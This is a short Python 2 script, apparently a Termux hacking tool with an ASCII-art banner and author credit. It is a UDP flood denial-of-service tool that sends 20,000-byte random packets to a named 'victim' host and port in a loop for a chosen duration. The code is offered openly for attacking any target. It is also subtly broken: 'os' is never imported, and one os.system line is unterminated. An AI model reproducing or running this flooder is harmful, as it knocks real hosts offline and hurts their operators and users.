import time
import socket
import random
import sys
def usage():
    os.system("clear")
    os.system("termux-open-url  https://youtube.com/channel/UC5qaTtGpIDZABVOSKwKcYtQ
    print "\033[1;31m                      ..-------.`"
    print "\033[1;31m                `--::-..........-:::--`"
    print "\033[1;31m             .-:-.`     ````````    `.-:-."
    print "\033[1;31m           -:-`      ````````````       .-:-"
    print "\033[1;31m         -/.      ````           ````      -/."
    print "\033[1;31m       `/-     `.`      `` ```       `.      :/`"
    print "\033[1;31m      `+.     ..         -.--         `.`     .+`"
    print "\033[1;31m     `o`     .`   `     `:.+.      `    ..     `+"
    print "\033[1;31m     +.     .`   `````  `///`      ``    .`     -/"
    print "\033[1;31m     o./`:/`-    ````````./o-```` ```     - -:`-/o"
    print "\033[1;31m    -: +`+/.`    ````...//+o//:.`````     -  +`/:+."
    print "\033[1;31m    :-   ``.`     ```.`-o////+/-`````     -  ` ``/-"
    print "\033[1;31m    ./     `.      ``-`.+/+m+o:-.``       -      +`"
    print "\033[1;31m     o      -       `-`.://ss+---`       `.      o"
    print "\033[1;31m     ::     `.     ````...-:---..``     `-      /-"
    print "\033[1;31m      /-     `.     `.```./--..--`     `.      :/"
    print "\033[1;37m       /:     `.`   `````.:...```     ..      ::"
    print "\033[1;37m        -/.     ````````  ``````    ```     ./-"
    print "\033[1;37m```````` `::.      `````     ```````      .::`"
    print "\033[1;37m           `-:-`       `````````       `-:-````````````"
    print "\033[1;37m.`            .-:.```   ````````  ```::-.             `"
    print "\033[1;37m ..`              `.--:::::-:::::--.`              `.``"
    print "\033[1;37m   ..`                                          `..`"
    print "\033[1;37m     ..```````````````````````````````````````..`"
    print "\033[1;31m Author   : Garuda12cyber"
    print "\033[1;37m github   : https://github.com/Garuda12cyber"
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
